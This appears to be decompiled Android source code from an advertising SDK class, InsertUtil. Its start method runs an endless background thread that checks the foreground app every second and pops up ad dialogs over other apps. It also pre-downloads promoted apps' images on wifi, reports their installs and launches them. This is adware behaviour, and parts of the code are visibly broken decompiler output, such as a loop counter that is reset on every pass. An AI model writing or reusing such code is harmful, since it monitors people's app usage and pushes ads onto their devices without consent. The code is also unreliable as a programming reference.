package workspace.mixsdk;
import java.util.ArrayList;
import java.util.List;
import workspace.bean.App;
import workspace.util.CommonUtils;
import workspace.util.Constants;
import workspace.util.ReportUtils;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Message;

public class InsertUtil {
    private static boolean checkwifi() {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context.getApplicationContext().getSystemService("connectivity");
        if (connectivitymanager != null) {
            //L1_L1:
            NetworkInfo anetworkinfo[] = connectivitymanager.getAllNetworkInfo();
            if (anetworkinfo != null) {
                int i = 0;
                while (i < anetworkinfo.length) {
                    if (anetworkinfo[i].getTypeName().equals("WIFI") && anetworkinfo[i].isConnected()) { return true; }
                    i++;
                }
            }
        }
        return false;
    }
    static void downfirst(List<App> list) {
        imgs = list;
        showimgs = new ArrayList<App>();
        int i = 0;
        do {
            int j;
            for (j = 0; i >= list.size() || j == 2;) {
                return;
            }
            String s = list.get(i).packageName;
            if (!CommonUtils.apkExits(context, s)) {
                if (j == 0) {
                    showimgs.add(list.get(i));
                } else {
                    showimgs.add(list.get(i));
                }
                if (checkwifi() && showimgs.size() != 0) {
                    DownloadUtils.setImages2(list, i, 2, "");
                }
                j++;
            }
            i++;
        } while (true);
    }
    static void getBms(List<App> apps, int i) {
        Message message = Message.obtain();
        message.what = 4;
        message.obj = apps;
        handler.sendMessage(message);
    }
    static void getImgs(List<App> arraylist, int i) {
        Message message = Message.obtain();
        message.what = 3;
        message.obj = arraylist;
        handler.sendMessage(message);
    }
    private static Context context;
    private static Handler handler;
    private static List<App> imgs;
    private static List<App> showimgs;
    private Thread actThread;
    private InsertUI alertDialog;
    private List<App> imgs_show5;
    private int insertShowIndexMax;
    private String lastpackageName;
    private SharedPreferences sp;
    private static final int INSERT_APKINSTALLED = 2;
    private static final int INSERT_GETBMS = 4;
    private static final int INSERT_GETIMGS = 3;
    private static final int INSERT_SHOWALERTDIALOG = 1;
    private static final int SHOW_POP = 6;
    private void ApkInstalled(Context context, String s) {
        int i1;
        SharedPreferences sharedpreferences = Constants.context.getSharedPreferences("CheckInit", 0);
        int i = sharedpreferences.getInt("installMonth", 1 + CommonUtils.getMonth());
        if (1 + CommonUtils.getMonth() > i) {} else {}
        if (imgs_show5 != null) {
            int size = imgs_show5.size();
            i1 = 0;
            if (size != 0) {
                while (i1 < imgs_show5.size()) {
                    if (s.equals(imgs_show5.get(i1).packageName)) {
                        //int adId = Integer.parseInt(((ImageInfo) imgs_show5.get(i1)).getId());
                        //Tools.sendDataToService(new StringBuilder(CS.apkInstalled + "uuid=").append(s1).append("&app_id=").append(appid).append("&ad_id=").append(adId) .append("&survivaltime=").append(k).toString());
                        ReportUtils.apkInstalledReport();
                        context.startActivity(context.getPackageManager().getLaunchIntentForPackage(s));
                        return;
                    }
                    i1++;
                }
            }
        }
    }
    private boolean checkSysAct(String s) {
        String packageName = "";
        try {
            packageName = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).packageName;
        } catch (android.content.pm.PackageManager.NameNotFoundException namenotfoundexception) {
            namenotfoundexception.printStackTrace();
        }
        List<String> arraylist = new ArrayList<String>();
        arraylist.add("com.example.servicedemo");
        arraylist.add("com.sec.");
        arraylist.add("com.wandoujia.");
        arraylist.add("com.samsung.");
        arraylist.add("com.htc.launcher");
        arraylist.add("com.android.packageinstaller");
        arraylist.add("com.qihoo");
        arraylist.add("com.legame.sybbvideo1");
        arraylist.add(packageName);
        int i = 0;
        do {
            if (i >= arraylist.size()) {
                if (lastpackageName == null || !lastpackageName.equals(s)) {
                    lastpackageName = s;
                    return false;
                }
                break;
            }
            if (s.contains(arraylist.get(i)) || s.equals("android")) { return true; }
            i++;
        } while (true);
        if (!lastpackageName.equals(s)) {
            lastpackageName = s;
            return false;
        } else {
            return true;
        }
    }
    private void createHandler(final Context context) {
        handler = new Handler() {
            @SuppressWarnings("unchecked")
            @Override
            public void handleMessage(Message message) {
                switch (message.what) {
                    case INSERT_SHOWALERTDIALOG: // '\001'
                        showAlertDialog();
                        return;
                    case INSERT_APKINSTALLED: // '\002'
                        ApkInstalled(context, (String) message.obj);
                        return;
                    case INSERT_GETIMGS: // '\003'
                        InsertImgUtil.downloadScreenAndIcon((List<App>) message.obj, 2);
                        return;
                    case INSERT_GETBMS: // '\004'
                        try {
                            alertDialog.showImages((List<App>) message.obj, insertShowIndexMax);
                            return;
                        } catch (Exception exception) {
                            exception.printStackTrace();
                        }
                        return;
                    case SHOW_POP: // '\006'
                        new PopUI(InsertUtil.context).initView();
                        return;
                }
            }
        };
    }
    private void showAlertDialog() {
        if (imgs == null) {
            String appId = context.getSharedPreferences("insertShow", 0).getString("appid", "");
            String url = Constants.getAdsListUrl(context, appId, "2", "ad");
            InsertImgUtil.getImgs(url, 3);
        } else {
            downfirst(imgs);
            alertDialog = new InsertUI(context.getApplicationContext());
            SharedPreferences pref = context.getSharedPreferences("insertShow", 0);
            String appId = pref.getString("appid", "");
            if (pref.getString("status", "").equals("1") && CommonUtils.isNotEmpty(appId) && showimgs != null) {
                getImgs(showimgs, 2);
                return;
            }
        }
    }
    public void start(Context context1) {
        createHandler(context1);
        if (Constants.context != null) {
            context = Constants.context;
        } else {
            context = context1;
            Constants.context = context1;
        }
        sp = context.getSharedPreferences("insertShow", 0);
        sp.getString("appid", "");
        new DownloadUtils().onCreate();
        SharedPreferences pref = context.getSharedPreferences("insertShow", 0);
        String appId = pref.getString("appid", "");
        if (pref.getString("status", "").equals("1") && CommonUtils.isNotEmpty(appId)) {
            String url = Constants.getAdsListUrl(context1, appId, "2", "ad");
            InsertImgUtil.getImgs(url, 3);
        }
        actThread = new Thread() {
            @Override
            public void run() {
                int size = 0;
                while (true) {
                    ActivityManager activitymanager = (ActivityManager) InsertUtil.context.getSystemService("activity");
                    List<RunningTaskInfo> list = activitymanager.getRunningTasks(1000);
                    ComponentName componentName = activitymanager.getRunningTasks(1).get(0).topActivity;
                    if (!(list.size() <= size || checkSysAct(componentName.getPackageName()))) {
                        size = list.size();
                        SharedPreferences sharedpreferences1 = InsertUtil.context.getSharedPreferences("insertShow", 0);
                        int frequency = sharedpreferences1.getInt("frequency", 0);
                        int times = sp.getInt("times", 0);
                        long preTime = sharedpreferences1.getLong("preTime", 0L);
                        if (!(Math.abs(System.currentTimeMillis() - preTime) / 1000L <= 2 + frequency * 60 && times != 0)) {
                            android.content.SharedPreferences.Editor editor = sp.edit();
                            editor.putInt("times", times + 1);
                            editor.putLong("preTime", System.currentTimeMillis());
                            editor.commit();
                            InsertUtil.handler.sendEmptyMessage(1);
                            size = list.size();
                        } else {
                            size = list.size();
                        }
                    } else {
                        size = list.size();
                    }
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        };
        actThread.start();
        handler.sendEmptyMessageDelayed(5, 5000L);
    }
}
